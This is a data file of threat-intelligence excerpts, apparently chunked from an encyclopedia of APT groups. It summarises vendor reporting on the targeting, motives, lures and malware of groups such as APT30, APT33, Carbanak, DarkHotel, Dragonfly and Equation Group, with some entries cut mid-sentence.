APT 30 is a threat group suspected to be associated with the Chinese government. While Naikon shares some characteristics with APT 30, the two groups do not appear to be exact matches. (FireEye) When our Singapore-based FireEye labs team examined malware aimed predominantly at entities in Southeast Asia and India, we suspected that we were peering into a regionally focused cyber espionage operation. The malware revealed a decade-long operation focused on targets—government and commercial—who hold key political, economic, and military information about the region. This group, who we call APT30, stands out not only for their sustained activity and regional focus, but also for their continued success despite maintaining relatively consistent tools, tactics, and infrastructure since at least 2005. Based on our knowledge of APT30's targeting activity and tools, their objective appears to be data theft as opposed to financial gain. APT30 has not been observed to target victims or data that can be readily monetized (for example, credit card data, personally identifiable information, or bank transfer credentials). Instead, their tools include functionality that allows them to identify and steal documents, including what appears to be an interest in documents that may be stored on air-gapped networks. The group expresses a distinct interest in organizations and governments associated with ASEAN, particularly so around the time of official ASEAN meetings."|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|e8205b54f1b7428a817b998712826a3d
"Many of APT30’s decoy documents use topics related to Southeast Asia, India, border areas, and broader security and diplomatic issues. Decoy documents attached to spear phishing emails are frequently indicators of intended targeting because threat actors generally tailor these emails to entice their intended targets —who typically work on related issues—to click on the attachments and infect themselves. In addition to APT30’s Southeast Asia and India focus, we’ve observed APT30 target journalists reporting on issues traditionally considered to be focal points for the Chinese Communist Party’s sense of legitimacy, such as corruption, the economy, and human rights. In China, the Communist Party has the ultimate authority over the government. China-based threat groups have targeted journalists before; we believe they often do so to get a better understanding on developing stories to anticipate unfavorable coverage and better position themselves to shape public messaging.

Description

(FireEye) When discussing suspected Middle Eastern hacker groups with destructive capabilities, many automatically think of the suspected Iranian group that previously used SHAMOON – aka Disttrack – to target organizations in the Persian Gulf. However, over the past few years, we have been tracking a separate, less widely known suspected Iranian group with potential destructive capabilities, whom we call APT33. Our analysis reveals that APT33 is a capable group that has carried out cyber espionage operations since at least 2013. We assess APT33 works at the behest of the Iranian government. APT33 has targeted organizations – spanning multiple industries – headquartered in the United States, Saudi Arabia and South Korea. APT33 has shown particular interest in organizations in the aviation sector involved in both military and commercial capacities, as well as organizations in the energy sector with ties to petrochemical production. APT 33 seems to be closely related to OilRig, APT 34, Helix Kitten.

(Talos) Group 72 is a long standing threat actor group involved in Operation SMN, named Axiom by Novetta. The group is sophisticated, well funded, and possesses an established, defined software development methodology. The group targets high profile organizations with high value intellectual property in the manufacturing, industrial, aerospace, defense, media sectors. Geographically, the group almost exclusively targets organizations based in United States, Japan, Taiwan, and Korea. The preferred tactics of the group include watering-hole attacks, spearphishing, and other web-based tactics. The tools and infrastructure used by the attackers are common to a number of other threat actor groups which may indicate some degree of overlap. We have seen similar patterns used in domain registration for malicious domains, and the same tactics used in other threat actor groups leading us to believe that this group may be part of a larger organization that comprises many separate teams, or that different groups share tactics, code and personnel from time to time. Though both this group and Winnti Group, Blackfly, Wicked Panda use the malware Winnti, the two groups appear to be distinct based on differences in reporting on the groups’ TTPs and targeting.

Description

(Bellingcat) Bahamut was first noticed when it targeted a Middle Eastern human rights activist in the first week of January 2017. Later that month, the same tactics and patterns were seen in attempts against an Iranian women’s activist – an individual commonly targeted by Iranian actors, such as Charming Kitten, Newscaster, NewsBeef and the Sima campaign documented in our 2016 Black Hat talk. Recurrent patterns in hostnames, registrations, and phishing scripts provided a strong link between the two incidents, and older attempts were found that directly overlapped with these attacks. Over the course of the following months, several more attempts against the same individuals were observed, intended to steal credentials for iCloud and Gmail accounts. Bahamut was also observed engaging in reconnaissance and counterreconnaissance attempts, intended to harvest IP addresses of emails accounts. One attempt impersonated BBC News Alerts, using timely content related to the diplomatic conflict between Qatar and other Gulf states as bait. This message used external images embedded in the email to track where the lure would be opened.

Beginning in December 2016, unconnected Middle Eastern human rights activists began to receive spear-phishing messages in English and Persian that were not related to any previously-known groups. These attempts differed from other tactics seen by us elsewhere, such as those connected to Iran, with better attention paid to the operation of the campaign. <https://www.bellingcat.com/news/mena/2017/06/12/bahamutpursuing-cyber-espionage-actor-middle-east/>

For three months there was no apparent further activity from the actor. However, in the same week of September a series of spear-phishing attempts once again targeted a set of otherwise unrelated individuals, employing the same tactics as before.

Description

(Microsoft) Barium begins its attacks by cultivating relationships with potential victims—particularly those working in Business Development or Human Resources—on various social media platforms. Once Barium has established rapport, they spear-phish the victim using a variety of unsophisticated malware installation vectors, including malicious shortcut (.lnk) files with hidden payloads, compiled HTML help (.chm) files, or Microsoft Office documents containing macros or exploits. Initial intrusion stages feature the Win32/Barlaiy implant—notable for its use of social network profiles, collaborative document editing sites, and blogs for C&C. Later stages of the intrusions rely upon Winnti for persistent access. The majority of victims recorded to date have been in electronic gaming, multimedia, and Internet content industries, although occasional intrusions against technology companies have occurred.

Operation “ShadowHammer” A supply-chain attack dubbed “Operation ShadowHammer” has been uncovered, targeting users of the ASUS Live Update Utility with a backdoor injection. The China-backed BARIUM APT is suspected to be at the helm of the project. According to Kaspersky Lab, the campaign ran from June to at least November 2018 and may have impacted more than a million users worldwide – though the adversaries appear to have been after specific victims in Asia. <https://threatpost.com/asus-pc-backdoors-shadowhammer/143129/>

(Trend Micro) Blackgear is an espionage campaign which has targeted users in Taiwan for many years. Multiple papers and talks have been released covering this campaign, which used the ELIRKS backdoor when it was first discovered in 2012. It is known for using blogs and microblogging services to hide the location of its actual command-and-control (C&C) servers. This allows an attacker to change the C&C server used quickly by changing the information in these posts. Like most campaigns, Blackgear has evolved over time. Our research indicates that it has started targeting Japanese users. Two things led us to this conclusion: first, the fake documents that are used as part of its infection routines are now in Japanese. Secondly, it is now using blogging sites and microblogging services based in Japan for its C&C activity.

Operation “PLEAD” PLEAD is an information theft campaign with a penchant for confidential documents. Active since 2012, it has so far targeted Taiwanese government agencies and private organizations.

2014

Operation “Waterbear” Waterbear has actually been operating for a long time. The campaign’s name is based on its malware’s capability to equip additional functions remotely.

Jul 2018

ESET researchers have discovered a new malware campaign misusing stolen digital certificates. We spotted this malware campaign when our systems marked several files as suspicious. Interestingly, the flagged files were digitally signed using a valid D-Link Corporation code-signing certificate. The exact same certificate had been used to sign non-malicious D-Link software; therefore, the certificate was likely stolen. <https://www.welivesecurity.com/2018/07/09/certificates-stolentaiwanese-tech-companies-plead-malware-campaign/>

Apr 2019

At the end of April 2019, ESET researchers utilizing ESET telemetry observed multiple attempts to deploy Plead malware in an unusual way. Specifically, the Plead backdoor was created and executed by a legitimate process named AsusWSPanel.exe. This process belongs to the Windows client for a cloud storage service called ASUS WebStorage.

(Kaspersky) In October 2014, Kaspersky Lab started to research “Blue Termite”, an Advanced Persistent Threat (APT) targeting Japan. The oldest sample we’ve seen up to now is from November 2013. This is not the first time the country has been a victim of an APT. However, the attack is different in two respects: unlike other APTs, the main focus of Blue Termite is to attack Japanese organizations; and most of their C2s are located in Japan. One of the top targets is the Japan Pension Service, but the list of targeted industries includes government and government agencies, local governments, public interest groups, universities, banks, financial services, energy, communication, heavy industry, chemical, automotive, electrical, news media, information services sector, health care, real estate, food, semiconductor, robotics, construction, insurance, transportation and so on. Unfortunately, the attack is still active and the number of victims has been increasing.

Readers who are interested in this campaign should start with our first blog that lays out the overall functionality of the malware and introduces its many components. Unit 42 does not have detailed targeting information for all known Bookworm samples, but we are aware of attempted attacks on at least two branches of government in Thailand. We speculate that other attacks delivering Bookworm were also targeting organizations in Thailand based on the contents of the associated decoys documents, as well as several of the dynamic DNS domain names used to host C2 servers that contain the words “Thai” or “Thailand”. Analysis of compromised systems seen communicating with Bookworm C2 servers also confirms our speculation on targeting with a majority of systems existing within Thailand.

Description

(Group-IB) Buhtrap has been active since 2014, however their first attacks against financial institutions were only detected in August 2015. Earlier, the group had only focused on targeting banking clients. At the moment, the group is known to target Russian and Ukrainian banks. From August 2015 to February 2016 Buhtrap managed to conduct 13 successful attacks against Russian banks for a total amount of 1.8 billion rubles ($25.7 mln). The number of successful attacks against Ukrainian banks has not been identified. Buhtrap is the first hacker group using a network worm to infect the overall bank infrastructure that significantly increases the difficulty of removing all malicious functions from the network. As a result, banks have to shut down the whole infrastructure which provokes delay in servicing customers and additional losses. Malicious programs intentionally scan for machines with an automated BankCustomer system of the Central Bank of Russia (further referred to as BCS CBR). We have not identified incidents of attacks involving online money transfer systems, ATM machines or payment gates which are known to be of interest for other criminal groups.

Description

(Symantec) Symantec telemetry identified Cadelle and Chafer, APT 39 activity dating from as far back as July 2014, however, it’s likely that activity began well before this date. Command-and-control (C&C) registrant information points to activity possibly as early as 2011, while executable compilation times suggest early 2012. Their attacks continue to the present day. Symantec estimates that each team is made up of between 5 and 10 people. There is evidence to suggest that the two teams may be connected in some way, though we cannot confirm this. A number of computers experienced both Cadelspy and Remexi infections within a small time window. In one instance, a computer was compromised with Backdoor.Cadelspy just minutes after being infected with Backdoor.Remexi. The Cadelle and Chafer groups also keep the same working hours and focus on similar targets. However, no sharing of C&C infrastructure between the teams has been observed. If Cadelle and Chafer are not directly linked, then they may be separately working for a single entity. Their victim profile may be of interest to a nation state.

Information theft and espionage

Description

(F-Secure) The most obvious common theme between all known targets of the Callisto Group is an involvement in European foreign and security policy, whether as a military or government official, being employed by a think tank, or working as a journalist . More specifically, many of the known targets have a clear relation to foreign and security policy involving both Eastern Europe and the South Caucasus. This targeting suggests the Callisto Group is interested in intelligence gathering related to foreign and security policy. Furthermore, we are unaware of any targeting in the described attacks that would suggest a financial motive It is worth noting that during our investigation we uncovered links between infrastructure associated with the Callisto Group and infrastructure used to host online stores selling controlled substances. While we don’t yet know enough to fully understand the nature of these links, they do suggest the existence of connections between the Callisto Group and criminal actors. While the targeting would suggest that the main benefactor of the Callisto Group’s activity is a nation state with specific interest in the Eastern Europe and South Caucasus regions, the link to infrastructure used for the sale of controlled substances hints at the involvement of a criminal element."|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|eaae66608d0f48038fce3911823997af
"Finally, the infrastructure associated with the Callisto Group and related infrastructure contain links to at least Russia, Ukraine, and China in both the content hosted on the infrastructure, and in WHOIS information associated with the infrastructure. It is possible to come up with a number of plausible theories to explain the above findings. For example, a cybercrime group with ties to a nation state, such as acting on behalf of or for the benefit of a government agency, is one potential explanation. However, we do not believe it is possible to make any definitive assertions regarding the nature or affiliation of the Callisto Group based on the currently available information.

Description

Carbanak is a threat group that mainly targets banks. It also refers to malware of the same name (Carbanak). It is sometimes referred to as FIN7, but these appear to be two groups using the same Carbanak malware and are therefore tracked separately. (Kaspersky) From late 2013 onwards, several banks and financial institutions have been attacked by an unknown group of cybercriminals. In all these attacks, a similar modus operandi was used. According to victims and the law enforcement agencies (LEAs) involved in the investigation, this could result in cumulative losses of up to 1 billion USD. The attacks are still active. This report provides a technical analysis of these attacks. The motivation for the attackers, who are making use of techniques commonly seen in Advanced Persistent Threats (APTs), appears to be financial gain as opposed to espionage. An analysis of the campaign has revealed that the initial infections were achieved using spear phishing emails that appeared to be legitimate banking communications, with Microsoft Word 97 – 2003 (.doc) and Control Panel Applet (.CPL) files attached. We believe that the attackers also redirected to exploit kits website traffic that related to financial activity.

Description

(Kaspersky) The Mask is an advanced threat actor that has been involved in cyberespionage operations since at least 2007. The name ""Mask"" comes from the Spanish slang word ""Careto"" (""Ugly Face"" or “Mask”) which the authors included in some of the malware modules. More than 380 unique victims in 31 countries have been observed to date. What makes “The Mask” special is the complexity of the toolset used by the attackers. This includes an extremely sophisticated malware, a rootkit, a bootkit, 32-and 64-bit Windows versions, Mac OS X and Linux versions and possibly versions for Android and iPad/iPhone (Apple iOS).

Description

(FireEye) APT39 was created to bring together previous activities and methods used by this actor, and its activities largely align with a group publicly referred to as ""Chafer."" However, there are differences in what has been publicly reported due to the variances in how organizations track activity. APT39 primarily leverages the SEAWEED and CACHEMONEY backdoors along with a specific variant of the POWBAT backdoor. While APT39's targeting scope is global, its activities are concentrated in the Middle East. APT39 has prioritized the telecommunications sector, with additional targeting of the travel industry and IT firms that support it and the high-tech industry. APT39's focus on the telecommunications and travel industries suggests intent to perform monitoring, tracking, or surveillance operations against specific individuals, collect proprietary or customer data for commercial or operational purposes that serve strategic requirements related to national priorities, or create additional accesses and vectors to facilitate future campaigns. Government entities targeting suggests a potential secondary intent to collect geopolitical data that may benefit nation-state decision making. Targeting data supports the belief that APT39's key mission is to track or monitor targets of interest, collect personal information, including travel itineraries, and gather customer data from telecommunications firms."|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|97841dac38c5481fbcd4cb02d3edd08a

Chafer appears to have been undeterred by its exposure in 2015 and continued to be very active during 2017, using seven new tools, rolling out new infrastructure, and attacking nine new target organizations in the region. The group hit organizations in Israel, Jordan, the United Arab Emirates, Saudi Arabia, and Turkey. Sectors targeted included airlines; aircraft services; software and IT services companies serving the air and sea transport sectors; telecoms services; payroll services; engineering consultancies; and document management software. Outside of the Middle East, Symantec has also found evidence of attacks against one African airline and attempts to compromise an international travel reservations firm. <https://www.symantec.com/blogs/threat-intelligence/chafer-latestattacks-reveal-heightened-ambitions>

Charming Kitten is an Iranian cyberespionage group that has been active since approximately 2014. They appear to focus on targeting individuals of interest to Iran who work in academic research, human rights, and media, with most victims having been located in Iran, the US, Israel, and the UK. Charming Kitten usually tries to access private email and Facebook accounts, and sometimes establishes a foothold on victim computers as a secondary objective. The group's TTPs overlap extensively with another group, Magic Hound, APT 35, Cobalt Gypsy, Rocket Kitten, resulting in reporting that may not distinguish between the two groups' activities.

Clever Kitten actors have a strong affinity for PHP server-side attacks to make access; this is relatively unique amongst targeted attackers who often favor targeting a specific individual at a specific organization using social engineering. Some attackers have moved to leveraging strategic web compromises. The reason for this is likely the availability of exploits against web browsers, which for a variety of reasons allows an attacker to bypass security features such as Data Execution Prevention (DEP) or Address Space Layout Randomization (ASLR).

One of the latest examples related to the campaign under analysis was used in attacks just a few days ago. It shows the simplicity of the attack delivery employed by this group.

Description

(Lastline) While reviewing some network anomalies, we recently uncovered Cold River, a sophisticated threat actor making malicious use of DNS tunneling for command and control activities. We have been able to decode the raw traffic in command and control, find sophisticated lure documents used in the campaign, connect other previously unknown samples, and associate a number of legitimate organizations whose infrastructure is referenced and used in the campaign. The campaign targets Middle Eastern organizations largely from the Lebanon and United Arab Emirates, though, Indian and Canadian companies with interests in those Middle Eastern countries are also targeted. There are new TTPs used in this attack – for example Agent_Drable is leveraging the Django python framework for command and control infrastructure, the technical details of which are outlined later in the blog.

Description

Also known as APT1, Comment Crew is an advanced persistent threat (APT) group with links to the Chinese military. The threat actors, which were active from roughly 2006 to 2010, managed to strike over 140 US companies in the quest for sensitive corporate and intellectual property data. The group earned their name through their use of HTML comments to hide communication to the command-and-control servers. The usual attack vector was via spear-phishing campaigns utilizing emails which contained documents with names tailored for the potential victims, such as “ArmyPlansConferenceOnNewGCVSolicitation.pdf,” or “Chinese Oil Executive Learning From Experience.doc.”

Description

(Trend Micro) Confucius’ campaigns were reportedly active as early as 2013, abusing Yahoo! And Quora forums as part of their command-and-control (C&C) communications. We stumbled upon Confucius, likely from South Asia, while delving into Patchwork’s cyberespionage operations. Confucius’ operations include deploying bespoke backdoors and stealing files from their victim’s systems with tailored file stealers. The stolen files are then exfiltrated by abusing a cloud service provider. Some of these file stealers specifically target files from USB devices, probably to overcome air-gapped environments. This group seems to be associated with Patchwork, Dropping Elephant.

In recent weeks, Unit 42 has discovered three documents crafted to exploit the InPage program. InPage is a word processor program that supports languages such as Urdu, Persian, Pashto, and Arabic.

Description

(Group-IB) In February 2015 the first major successful attack on a Russian trading system took place, when hackers gained unsanctioned access to trading system terminals using a Trojan resulting in trades of more than $400million. The criminals made purchases and sales of US dollars in the Dollar/Ruble exchange program on behalf of a bank using malware. The attack itself lasted only 14 minutes, however, it managed to cause a high volatility in the exchange rate of between 55/62 (Buy/Sell) rubles per 1 dollar instead of the 60-62 stable range. To conduct the attack criminals used the Corkow malware, also known as Metel, containing specific modules designed to conduct thefts from trading systems, such as QUIK operated by ARQA Technologies and TRANSAQ from ZAO “Screen market systems”. Corkow provided remote access to the ITS-Broker system terminal by «Platforma soft» Ltd., which enabled the fraud to be committed. In August 2015 a new incident related to the Corkow (Metel) Trojan was detected. An attack on a bank card systems, which included about 250 banks which used the bank card system to service cash withdrawals from Visa and MasterCard cards under a special tariff. This attack resulted in the hundreds of millions of rubles being stolen via ATMs of the systems members.

Description

(Dragos) Covellite compromises networks associated with civilian electric energy worldwide and gathers intelligence on intellectual property and internal industrial operations. Covellite lacks an industrial control system (ICS) specific capability at this time. Covellite operates globally with targets primarily in Europe, East Asia, and North America. US targets emerged in September 2017 with a small, targeted phishing campaign directed at select U.S. electric companies. The phishing emails contained a malicious Microsoft Word document and infected computers with malware. The malicious emails discovered in the fall masqueraded as resumes or invitations. They delivered a remote access tool (RAT) payload which was used to conduct reconnaissance and enable persistent, covert access to victims’ machines. Covellite’s infrastructure and malware are similar to the hacking organization known as Lazarus Group, Hidden Cobra, Labyrinth Chollima by Novetta and Hidden Cobra by the U.S. Department of Homeland Security. Lazarus Group is responsible for attacks ranging from the 2014 attack on Sony Pictures to a number of Bitcoin heists in 2017. Technical analysis of Covellite malware indicates an evolution from known Lazarus toolkits. However, aside from technical overlap, it is not known how the capabilities and operations between Covellite and Lazarus are related."|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|c6aeda557848406da6fb4e350e16867b
"Covellite remains active but appears to have abandoned North American targets, with indications of activity in Europe and East Asia. Given the group’s specific interest in infrastructure operations, rapidly improving capabilities, and history of aggressive targeting, Dragos considers this group a primary threat to the ICS industry.

(SecurityWeek) The activities of the DarkHotel advanced persistent threat (APT) actor came to light in November 2014, when Kaspersky published a report detailing a sophisticated cyberespionage campaign targeting business travelers in the Asia-Pacific region. The group has been around for nearly a decade and some researchers believe its members are Korean speakers. The attackers targeted their victims using several methods, including through their hotel’s Wi-Fi, zero-day exploits and peer-to-peer (P2P) file sharing websites. Nearly one year later, the threat group was observed using new attack techniques and an exploit leaked from Italian spyware maker Hacking Team. DarkHotel victims have been spotted in several countries, including North Korea, Russia, South Korea, Japan, Bangladesh, Thailand, Taiwan, China, the United States, India, Mozambique, Indonesia and Germany. Up until recently, the attacks appeared to focus on company executives, researchers and development personnel from sectors such as defense industrial base, military, energy, government, NGOs, electronics manufacturing, pharmaceutical, and medical. In more recent DarkHotel attacks it has dubbed “Inexsmar,” security firm Bitdefender said the hackers targeted political figures, and they appeared to be using some new methods.

Operation “DarkHotel” Target: The travelers are often top executives from a variety of industries doing business and outsourcing in the APAC region. Targets have included CEOs, senior vice presidents, sales and marketing directors and top R&D staff. Method: spear-phishing targets with highly advanced Flash zeroday exploits that effectively evade the latest Windows and Adobe defenses, and yet they also imprecisely spread among large numbers of vague targets with peer-to-peer spreading tactics. Moreover, this crew’s most unusual characteristic is that for several years the Darkhotel APT has maintained a capability to

This actor, who was engaged in targeting and collection of Southeast Asia policy information, suddenly began targeting individuals with a tie to Iraq/Middle East issues. This is undoubtedly related to the recent Islamic State of Iraq and the Levant (ISIS) takeover of major parts of Iraq and the potential disruption for major Chinese oil interests in that country. In fact, Iraq happens to be the fifth-largest source of crude oil imports for China and the country is the largest foreign investor in Iraq’s oil sector. <https://www.crowdstrike.com/blog/deep-thought-chinese-targetingnational-security-think-tanks/> Mar 2014

Description

(Kaspersky) The Global Research and Analysis Team (GReAT) at Kaspersky Lab has uncovered new targeted attacks in the Middle East. Native Arabic-speaking cybercriminals have built advanced methods and tools to deliver, hide and operate malware that they have also developed themselves. This malware was originally discovered during an investigation of one of the attacks in the Middle East. Political activities and news are being actively used by the cybercriminals to entice victims into opening files and attachments. Content has been created with professionalism, with well-designed visuals and interesting, familiar details for the victims, as if the information were long awaited. The victims of the attacks to date have been carefully chosen; they are active and influential in their respective cultures, but also attractive to the cybercriminals as a source of intelligence and a target for extortion. The attackers have been operating for more than two years now, running different campaigns, targeting different types of victims and different types of devices (including Windows- and Android-based). We suspect that at least 30 people distributed across different countries are operating the campaigns

Description

(Talos) Cisco Talos recently discovered a new campaign targeting Lebanon and the United Arab Emirates (UAE) affecting .gov domains, as well as a private Lebanese airline company. Based on our research, it's clear that this adversary spent time understanding the victims' network infrastructure in order to remain under the radar and act as inconspicuous as possible during their attacks. Based on this actor's infrastructure and TTPs, we haven't been able to connect them with any other campaign or actor that's been observed recently. This particular campaign utilizes two fake, malicious websites containing job postings that are used to compromise targets via malicious Microsoft Office documents with embedded macros. The malware utilized by this actor, which we are calling ""DNSpionage,"" supports HTTP and DNS communication with the attackers.

Information theft and espionage

Description

(Check Point) Recent investigations by Check Point researchers reveal an extensive and targeted attack that has been taking place since 2016 and, until now, has remained under the radar due to the artful deception of its attackers towards their targets. Through the use of mobile applications, those behind the attack use fake decoy content to entice their victims to download such applications, which are in fact loaded with spyware, to then collect sensitive information about them. Interestingly, these targets include Kurdish and Turkish natives and ISIS supporters. Most interesting of all, though, is that all these targets are actually Iranians citizens. Considering the nature of the target, the data collected about these groups provides those behind the campaign with highly valuable information that will no doubt be leveraged in further future action against them. Indeed, the malware collects data including contact lists stored on the victim’s mobile device, phone call records, SMS messages, browser history and bookmarks, geo-location of the victim, photos, surrounding voice recordings and more.

Observed

Countries: Afghanistan, Iran, Iraq and UK. The targets are Kurdish and Turkish natives and ISIS supporters.

Description

(ASERT) In late January 2018, ASERT discovered a new modular malware framework we call ""yty"". The framework shares a striking resemblance to the EHDevel framework. We believe with medium confidence that a team we call internally as ""Donot Team"" is responsible for the new malware and will resume targeting of South Asia. In a likely effort to disguise the malware and its operations, the authors coded several references into the malware for football—it is unclear whether they mean American football or soccer. The theme may allow the network traffic to fly under the radar. The actors use false personas to register their domains instead of opting for privacy protection services. Depending on the registrar service chosen, this could be seen as another cost control measure. The actors often used typo-squatting to slightly alter a legitimate domain name. In contrast, the registration information used accurate spelling, possibly indicating the domain naming was intentional, typos included. Each unique registrant usually registered only a few domains, but mistakenly reused phone numbers or the registration data portrayed a similar pattern across domains.

StealJob: New Android Malware Recently, we have observed a large-scale upgrade of its malicious Android APK framework to make it more stable and practical. Since the new APK framework is quite different from the one used in the past, we named it as StealJob since “job” is frequently used in the code. <https://ti.360.net/blog/articles/stealjob-new-android-malware-used-bydonot-apt-group-en/>

Description

DragonOK is a threat group that has targeted Japanese organizations with phishing emails. Due to overlapping TTPs, including similar custom tools, DragonOK is thought to have a direct or indirect relationship with the threat group Moafee. It is known to use a variety of malware, including Sysget/HelloBridge, PlugX, Poison Ivy, FormerFirstRat, NFlog, and NewCT.

This campaign involved five separate phishing attacks, each carrying a different variant of Sysget malware, also known as HelloBridge. The malware was included as an attachment intended to trick the user into opening the malware. All five phishing campaigns targeted a Japanese manufacturing firm over the course of two months, but the final campaign also targeted a separate Japanese high-tech organization. <https://unit42.paloaltonetworks.com/unit-42-identifies-new-dragonokbackdoor-malware-deployed-against-japanese-targets/>

In recent months, Unit 42 has observed a number of attacks that we attribute to this group. Multiple new variants of the previously discussed sysget malware family have been observed in use by DragonOK. Sysget malware was delivered both directly via phishing emails, as well as in Rich Text Format (RTF) documents exploiting the CVE-2015-1641 vulnerability that in turn leveraged a very unique shellcode. <https://unit42.paloaltonetworks.com/unit42-dragonok-updatestoolset-targets-multiple-geographic-regions/>

(Kaspersky) For the last two years we have been monitoring a Russian-language cyberespionage actor that focuses on Central Asian users and diplomatic entities. We named the actor DustSquad and have provided private intelligence reports to our customers on four of their campaigns involving custom Android and Windows malware. In this blogpost we cover a malicious program for Windows called Octopus that mostly targets diplomatic entities. The name was originally coined by ESET in 2017 after the 0ct0pus3.php script used by the actor on their old C2 servers. We also started monitoring the malware and, using Kaspersky Attribution Engine based on similarity algorithms, discovered that Octopus is related to DustSquad, something we reported in April 2018. In our telemetry we tracked this campaign back to 2014 in the former Soviet republics of Central Asia (still mostly Russian-speaking), plus Afghanistan.

Information theft and espionage

Description

(Cylance) Very little public information was available throughout 2010 on this threat, despite the group’s primary backdoor gaining some level of prominence in targeted Asian attacks. This may be explained by the group’s early reliance on Dynamic DNS domains for their command and control (C2) infrastructure, as well as their use of public RATs like Poison Ivy and Gh0st RAT for second-stage implants. It wasn’t until June 2011 that Operation Dust Storm started to garner some notoriety from a series of attacks which leveraged an unpatched Internet Explorer 8 vulnerability, CVE-2011-1255, to gain a foothold into victim networks. In these attacks, a link to the exploit was sent via a spear phishing email from a purported Chinese student seeking advice or asking the target a question following a presentation. As to other documented cases, the attacker started interacting with the infected machine within minutes of compromise to begin manual network and host enumeration. In October 2011, the group attempted to take advantage of the ongoing Libyan crisis at the time and phish the news cycle regarding Muammar Gaddafi’s death on October 20, 2011. It appears that in addition to some US defense targets, this campaign was also directed at a Uyghur mailing list. This time, the group used a specially crafted malicious Windows Help (.hlp) file, which exploited CVE-20101885."|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|5bf50bc3ebc840aeab2b6fc0727e7316

"Description

(Symantec) In 2009, Google was attacked by a group using the Hydraq (Aurora) Trojan horse. Symantec has monitored this group’s activities for the last three years as they have consistently targeted a number of industries. Interesting highlights in their method of operations include: the use of seemingly an unlimited number of zero-day exploits, attacks on supply chain manufacturers who service the target organization, and a shift to “watering hole” attacks (compromising certain websites likely to be visited by the target organization). The targeted industry sectors include, but are not restricted to; defense, various defense supply chain manufacturers, human rights and non-governmental organizations (NGOs), and IT service providers. These attackers are systematic and re-use components of an infrastructure we have termed the “Elderwood platform”. The name “Elderwood” comes from a source code variable used by the attackers. This attack platform enables them to quickly deploy zero-day exploits. Attacks are deployed through spear phishing emails and also, increasingly, through Web injections in watering hole attacks. It is likely the attackers have gained access to the source code for some widely used applications, or have thoroughly reverse-engineered the compiled applications in order to discover these vulnerabilities. The vulnerabilities are used as needed, often within close succession of each other if exposure of any of the vulnerabilities is imminent."|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|683223730a444ffaa6162ceaced3efc1
"The scale of the attacks, in terms of the number of victims and the duration of the attacks, are another indication of the resources available to the attackers. Victims are attacked, not for petty crime or theft, but for the wholesale gathering of intelligence and intellectual property. The resources required to identify and acquire useful information—let alone analyze that information—could only be provided by a large criminal organization, attackers supported by a nation state, or a nation state itself.

Dragonfly is a cyberespionage group that has been active since at least 2011. They initially targeted defense and aviation companies but shifted to focus on the energy sector in early 2013. They have also targeted companies related to industrial control systems. According to Kaspersky, Crouching Yeti has been operating since at least 2010 and has infected roughly 2,800 targets in 38 countries, and in industries as diverse as education and pharmaceuticals. A similar group emerged in 2015 and was identified by Symantec as Berserk Bear, Dragonfly 2.0. There is debate over the extent of the overlap between Dragonfly and Berserk Bear, Dragonfly 2.0, but there is sufficient evidence to lead to these being tracked as two separate groups.

Spam campaign The Dragonfly group has used at least three infection tactics against targets in the energy sector. The earliest method was an email spear phishing campaign, which saw selected executives and senior employees in target companies receive emails containing a malicious PDF attachment. Infected emails had one of two subject lines: “The account” or “Settlement of delivery problem”. <https://www.symantec.com/content/en/us/enterprise/media/security_r esponse/whitepapers/Dragonfly_Threat_Against_Western_Energy_Su ppliers.pdf>

Watering Hole Attacks using Lightsout In June 2013, the attackers shifted their focus to watering hole attacks. They compromised a number of energy-related websites and injected an iframe into each of them. This iframe then redirected visitors to another compromised legitimate website hosting the Lightsout exploit kit. This in turn exploited either Java or Internet Explorer in order to drop Oldrea or Karagany on the victim’s computer.

Description

(Ars Technica) Kaspersky researchers have documented 500 infections by Equation Group in at least 42 countries, with Iran, Russia, Pakistan, Afghanistan, India, Syria, and Mali topping the list. Because of a self-destruct mechanism built into the malware, the researchers suspect that this is just a tiny percentage of the total; the actual number of victims likely reaches into the tens of thousands. A long list of almost superhuman technical feats illustrate Equation Group's extraordinary skill, painstaking work, and unlimited resources. They include: "|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|0404de81ac61466d965e0ccd193aa484
The use of virtual file systems, a feature also found in the highly sophisticated Regin malware. Recently published documents provided by Ed Snowden indicate that the NSA used Regin to infect the partly state-owned Belgian firm Belgacom. The stashing of malicious files in multiple branches of an infected computer's registry. By encrypting all malicious files and storing them in multiple branches of a computer's Windows registry, the infection was impossible to detect using antivirus software. Redirects that sent iPhone users to unique exploit Web pages. In addition, infected machines reporting to Equation Group command servers identified themselves as Macs, an indication that the group successfully compromised both iOS and OS X devices. The use of more than 300 Internet domains and 100 servers to host a sprawling command and control infrastructure. USB stick-based reconnaissance malware to map air-gapped networks, which are so sensitive that they aren't connected to the Internet. Both Stuxnet and the related Flame malware platform also had the ability to bridge airgaps. An unusual if not truly novel way of bypassing code-signing restrictions in modern versions of Windows, which require that all third-party software interfacing with the operating system kernel be digitally signed by a recognized certificate authority.|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|210b6e34ceaf47e79e970e25e641d6c5
"To circumvent this restriction, Equation Group malware exploited a known vulnerability in an already signed driver for CloneCD to achieve kernel-level code execution.

Taken together, the accomplishments led Kaspersky researchers to conclude that Equation Group is probably the most sophisticated computer attack group in the world, with technical skill and resources that rival the groups that developed Stuxnet and the Flame espionage malware. Their arsenal of 0-day cyber weapons was stolen by an actor Shadow Brokers, who leaked a large section on the internet4 and tried to sell the rest afterward. Most notable among the dumps were 0-days such as ETERNALBLUE and ETERNALROMANCE that were used by other groups for the creation of infamous ransomware explosions such as WannaCry and NotPetya.

